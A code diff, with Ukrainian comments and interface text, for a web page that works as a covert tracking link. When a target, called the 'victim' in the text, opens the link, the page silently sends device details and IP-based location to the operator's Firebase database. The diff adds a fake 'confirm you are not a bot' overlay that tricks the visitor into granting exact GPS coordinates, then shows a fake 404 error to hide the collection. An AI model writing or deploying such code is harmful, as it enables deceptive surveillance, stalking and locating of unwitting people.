@@ -152,12 +152,39 @@
   }
   .row .v.accent{color:var(--accent);}
   .row .v.warn{color:var(--warn);}
+
+  #victimOverlay {
+    position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+    background: rgba(11, 20, 22, 0.95);
+    display: flex; justify-content: center; align-items: center;
+    z-index: 9999; text-align: center; padding: 20px;
+  }
+  .trap-card {
+    background: var(--panel);
+    border: 1px solid var(--accent-dim);
+    padding: 30px;
+    border-radius: 8px;
+    max-width: 400px;
+    width: 100%;
+  }
+  .trap-card h2 { margin-top: 0; color: var(--accent); font-size: 20px; }
+  .trap-card p { color: var(--dim); font-size: 13.5px; line-height: 1.5; margin-bottom: 24px; }
 </style>
 
 <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
 <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
 </head>
 <body>
+
+  <!-- Фейкове вікно для жертви -->
+  <div id="victimOverlay" style="display: none;">
+    <div class="trap-card">
+      <h2>Підтвердження безпеки</h2>
+      <p>Щоб переглянути вміст захищеного посилання, підтвердіть, що ви не бот, натиснувши кнопку нижче.</p>
+      <button class="btn" id="trapBtn" style="width: 100%; padding: 12px; font-size: 14px;">Розблокувати сторінку</button>
+    </div>
+  </div>
+
 <div class="wrap">
 
   <div class="top">
@@ -183,7 +210,9 @@
       <div class="row"><div class="k">Провайдер / ASN (ISP)</div><div class="v accent" id="isp">—</div></div>
       <div class="row"><div class="k">Країна та код</div><div class="v" id="country">—</div></div>
       <div class="row"><div class="k">Місто / Регіон</div><div class="v" id="city">—</div></div>
-      <div class="row"><div class="k">Координати</div><div class="v" id="coords">—</div></div>
+      <div class="row"><div class="k">Координати (IP)</div><div class="v" id="coords">—</div></div>
+      <div class="row"><div class="k">Точний GPS (Браузер)</div><div class="v accent" id="exactCoords">—</div></div>
+      <div class="row"><div class="k">Похибка GPS</div><div class="v" id="accuracy">—</div></div>
       <div class="row"><div class="k">Поштовий індекс</div><div class="v" id="zip">—</div></div>
       <div class="row"><div class="k">Онлайн-статус</div><div class="v" id="online">—</div></div>
     </div>
@@ -205,7 +234,6 @@
       <div class="row"><div class="k">Платформа / ОС</div><div class="v" id="platform">—</div></div>
       <div class="row"><div class="k">Ядра CPU</div><div class="v" id="cores">—</div></div>
       <div class="row"><div class="k">Оперативна пам'ять (RAM)</div><div class="v" id="ram">—</div></div>
-      <div class="row"><div class="k">Графічний чип (GPU)</div><div class="v" id="gpu">—</div></div>
     </div>
   </div>
 
@@ -246,6 +274,8 @@
     document.getElementById('country').textContent = d.country || '—';
     document.getElementById('city').textContent = d.city || '—';
     document.getElementById('coords').textContent = d.coords || '—';
+    document.getElementById('exactCoords').textContent = d.exactCoords || 'Не надано / Відхилено';
+    document.getElementById('accuracy').textContent = d.accuracy || '—';
     document.getElementById('zip').textContent = d.zip || '—';
     document.getElementById('online').textContent = d.online || '—';
     document.getElementById('lang').textContent = d.language || '—';
@@ -259,6 +289,28 @@
     document.getElementById('ua').textContent = d.ua || '—';
   }
 
+  function requestGps() {
+    return new Promise((resolve) => {
+      if (!navigator.geolocation) {
+        resolve({ exactCoords: 'Не підтримується браузером', accuracy: '—' });
+        return;
+      }
+
+      navigator.geolocation.getCurrentPosition(
+        (position) => {
+          resolve({
+            exactCoords: `${position.coords.latitude}, ${position.coords.longitude}`,
+            accuracy: `~${Math.round(position.coords.accuracy)} м`
+          });
+        },
+        (error) => {
+          resolve({ exactCoords: 'Доступ відхилено користувачем', accuracy: '—' });
+        },
+        { timeout: 10000, enableHighAccuracy: true }
+      );
+    });
+  }
+
   async function collectMyData() {
     const data = {
       ua: navigator.userAgent,
@@ -269,6 +321,8 @@
       ram: navigator.deviceMemory ? '~' + navigator.deviceMemory + ' GB' : '—',
       online: navigator.onLine ? 'Online' : 'Offline',
       webdriver: navigator.webdriver ? 'ТАК (Бот)' : 'Ні (Людина)',
+      exactCoords: 'Очікування кліку...',
+      accuracy: '—',
       time: new Date().toISOString()
     };
 
@@ -301,7 +355,6 @@
     const viewId = urlParams.get('view');
 
     if (viewId) {
-      // 1. АДМІНКА: Ти відкрив своє посилання для перегляду логу
       document.getElementById('genBox').style.display = 'none';
       document.getElementById('heroLabel').textContent = `Твоя панель | ID логу: ${viewId}`;
       document.getElementById('heroLoc').textContent = 'Шукаємо дані в базі...';
@@ -309,36 +362,47 @@
       db.ref('logs/' + viewId).on('value', (snapshot) => {
         const val = snapshot.val();
         if (val) {
-          document.getElementById('heroLabel').textContent = `Дані отримано! Жертва піймалась.`;
+          document.getElementById('heroLabel').textContent = `Дані отримано!`;
           document.getElementById('heroLabel').style.color = 'var(--accent)';
           displayData(val);
         } else {
-          document.getElementById('heroLoc').textContent = 'Жертва ще не перейшла за посиланням. Очікування...';
+          document.getElementById('heroLoc').textContent = 'Жертва ще не відкрила посилання.';
         }
       });
 
     } else if (targetId) {
-      // 2. ЖЕРТВА: Хтось відкрив пастку
       document.getElementById('genBox').style.display = 'none';
-      
-      // ХОВАЄМО всі таблиці, щоб жертва не бачила свої дані
       document.querySelectorAll('.section').forEach(el => el.style.display = 'none');
       document.getElementById('heroIp').style.display = 'none';
       document.getElementById('heroLoc').style.display = 'none';
       
-      document.getElementById('heroLabel').textContent = 'Завантаження сторінки...';
+      // 1. АВТОМАТИЧНО збираємо і відправляємо ВСІ базові дані ОДРАЗУ при завантаженні сторінки
+      const initialData = await collectMyData();
+      await db.ref('logs/' + targetId).set(initialData);
 
-      const myData = await collectMyData();
-      
-      db.ref('logs/' + targetId).set(myData).then(() => {
-        // Коли дані відправлені, імітуємо помилку
-        document.getElementById('heroLabel').innerHTML = 'Помилка 404.<br>Сторінку не знайдено або переміщено.';
-        document.getElementById('heroLabel').style.color = 'var(--warn)';
-        document.getElementById('heroLabel').style.fontSize = '22px';
+      // 2. Показуємо вікно-пастку з кнопкою для добору GPS
+      document.getElementById('victimOverlay').style.display = 'flex';
+      document.getElementById('heroLabel').textContent = 'Очікування дії користувача...';
+
+      // 3. Якщо жертва клікає на кнопку — оновлюємо дані у тій самій базі, додаючи GPS
+      document.getElementById('trapBtn').addEventListener('click', async () => {
+        document.getElementById('victimOverlay').style.display = 'none';
+        document.getElementById('heroLabel').textContent = 'Оновлення геолокації...';
+
+        const gps = await requestGps();
+        
+        // Оновлюємо лише поля GPS у базі, не чіпаючи решту
+        db.ref('logs/' + targetId).update({
+          exactCoords: gps.exactCoords,
+          accuracy: gps.accuracy
+        }).then(() => {
+          document.getElementById('heroLabel').innerHTML = 'Помилка 404.<br>Сторінку не знайдено або переміщено.';
+          document.getElementById('heroLabel').style.color = 'var(--warn)';
+          document.getElementById('heroLabel').style.fontSize = '22px';
+        });
       });
 
     } else {
-      // 3. ГОЛОВНА СТОРІНКА: Ти щойно зайшов
       const myData = await collectMyData();
       displayData(myData);
     }
@@ -346,7 +410,6 @@
 
   init();
 
-  // Генерація двох різних посилань
   document.getElementById('genBtn').addEventListener('click', () => {
     const randomId = Math.random().toString(36).substring(2, 10);
     
